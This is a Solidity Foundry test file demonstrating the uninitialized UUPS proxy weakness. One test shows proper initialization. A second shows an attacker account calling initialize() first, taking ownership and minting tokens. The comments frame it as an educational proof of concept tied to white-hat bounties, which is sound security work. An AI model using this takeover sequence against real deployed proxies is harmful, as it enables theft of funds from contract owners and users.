// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {UUPSProxy} from "./UUPSProxy.sol";
import {TestToken} from "./TestToken.sol";

// These tests demonstrate the issue of an uninitialized UUPS proxy
// The solution is to initialize the UUPS proxy properly (by calling `initialize()` via the proxy contract)
// Multiple white hat bounties have been claimed for this issue

interface ITestToken {
    function balanceOf(address) external returns (uint256);
}

contract UUPS_selfdestruct is Test {
    TestToken public testToken;
    UUPSProxy public proxy;

    address public alice;

    function setUp() public {
        alice = address(0xABCDEF);

        // Deploy initial implementation and proxy contract
        testToken = new TestToken(); // Deploy implementation contract
        proxy = new UUPSProxy(address(testToken), ""); // Deploy ERC1967 proxy contract with testtoken logic as implementation
    }

    // Step 1: Initialize the proxy and verify the owner is this contract
    // This is the "ideal" scenario because the proper owner remembered to properly initialize the contract
    function testProperProxyInitialization() public {
        (bool validResponse, bytes memory returnedData) = address(proxy).call(
            abi.encodeWithSignature("initialize()")
        );
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));

        // owner of UUPSProxy contract should be this contract
        assertEq(owner, address(this));

        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("mint(uint256)", uint256(10 ether))
        );
        assertTrue(validResponse);

        // confirm this address has 10 ether worth of tokens
        assertEq(ITestToken(address(proxy)).balanceOf(address(this)), 10 ether);
    }

    // Step 2: Initialize proxy as Alice and verify the owner is Alice
    // The owner forgot to initialize the proxy so the first step for the attacker is to become the owner
    // Confirm Alice got the tokens minted in the initialize() function
    function testForgotProxyInitialization() public {
        vm.prank(address(alice));
        (bool validResponse, bytes memory returnedData) = address(proxy).call(
            abi.encodeWithSignature("initialize()")
        );
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));

        // owner of UUPSProxy contract is alice because the deployer forgot to initialize the UUPS proxy
        assertEq(owner, address(alice));

        vm.prank(address(alice));
		(validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("mint(uint256)", uint256(10 ether))
        );
        assertTrue(validResponse);

        // confirm that alice has 10 ether worth of tokens
        assertEq(ITestToken(address(proxy)).balanceOf(address(alice)), 10 ether);
    }
}
